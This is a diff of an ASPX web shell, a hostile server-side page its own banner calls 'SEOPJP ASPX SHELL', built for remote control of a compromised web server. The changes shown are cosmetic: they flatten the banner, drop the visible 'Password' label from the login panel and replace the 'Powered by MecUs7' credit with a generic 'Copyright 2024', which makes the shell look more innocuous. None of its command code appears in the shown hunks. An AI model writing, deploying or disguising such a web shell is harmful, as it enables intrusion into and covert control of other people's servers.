@@ -12,15 +12,7 @@
 <%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
 <!DOCTYPE html>
 <center><img src="https://i.ibb.co/gS91kwL/1000015604-removebg-preview.png" width="275" height="275"><center>        
-<h1><font color=blue>[<font color=crimson>' <font color=aqua>S
-<font color=yellow>E
-<font color=deeppink>O
-<font color=teal>P
-<font color=silver>J 
-<font color=silver>P 
-<font color=red>ASPX 
-<font color=white>SHELL 
-<font color=crimson>'<font color=blue>]</h1>
+<h1><font color=blue><font color=crimson><font color=aqua>S<font color=yellow>E<font color=deeppink>O<font color=teal>P<font color=silver>J<font color=silver>P <font color=red>ASPX <font color=white>SHELL<font color=crimson><font color=blue></h1>
 
 
 <style type="text/css">
@@ -1281,7 +1273,7 @@ return QS.Get();
          <div>
            
         <asp:Panel ID="Login" runat="server" Visible="false"  >
-           <h3 >Password  <asp:TextBox ID="Login_TextBox"  runat="server"></asp:TextBox> 
+           <h3 >  <asp:TextBox ID="Login_TextBox"  runat="server"></asp:TextBox> 
             <asp:Button ID="Login_Button" runat="server" Text="LogIn" OnClick="Login_Button_Click" />              
         </asp:Panel> 
               <asp:LinkButton ID="Logout" Visible="false"   style=" float :right;" runat="server" OnClick="Logout_Click">
@@ -1473,4 +1465,4 @@ return QS.Get();
     </div>
     </form>
           </body>
-<h1><font color="lime" size="6" face="Courier" new="">Powered by MecUs7</font></h1><font color="white"face="Courier" new=""> 
+<h1><font color="lime" size="6" face="Courier" new="">Copyright 2024</font></h1><font color="white"face="Courier" new=""> 
